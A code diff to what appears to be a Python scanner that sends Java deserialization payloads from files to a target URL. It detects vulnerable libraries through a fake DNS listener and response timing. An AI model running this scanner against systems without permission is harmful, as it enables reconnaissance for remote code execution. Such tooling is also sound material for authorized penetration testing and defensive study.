@@ -17,23 +17,27 @@ session.headers.update({
 
 # Fake DNS server to catch query while sending DNS java deserialization payloads
 def catch_dns_query():
+    global dns
+    time_start = time.time()
     check = True
     port = 53
     hostname = socket.gethostname()
     my_ip = socket.gethostbyname(hostname)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(6)
+    sock.settimeout(5)
     sock.bind((my_ip, port))
     try:
         while True:
             data, add = sock.recvfrom(1024)
             dns = DNSRecord.parse(data)
-            if "google" in str(dns.questions):
-                break
+            for ques in dns.questions:
+                r = dns.reply()
+                sock.sendto(r.pack(), add)
     except socket.timeout:
-        check = False
-    sock.close()
-    return check
+        if "google" in str(dns.questions):
+            return True
+        else:
+            return False
 
 
 # Java Deserialization Ping Scan
@@ -54,7 +58,6 @@ def ping_deserialization(url):
         rq = session.post(url, data=payload, verify=False)
         if catch_dns_query():
             print('\033[91m' + '    [+] {} lib can be POTENTIAL vulnerable'.format(name.strip()))
-        time.sleep(2)
 
 
 # Java Deserialization Sleep Scan
@@ -65,7 +68,7 @@ def sleep_deserialization(url):
     for name in list_sleep:
         payload = open('core/payload_sleep/{}.bin'.format(name), 'rb')
         rq = session.post(url, data=payload, verify=False)
-        # print(name + '-' + str(rq.elapsed.total_seconds()))
+        print(name + '-' + str(rq.elapsed.total_seconds()))
         if rq.elapsed.total_seconds() >= 10:
             print('\033[91m' + "    [+] {} lib can be POTENTIAL vulnerable".format(name))
         time.sleep(0.5)
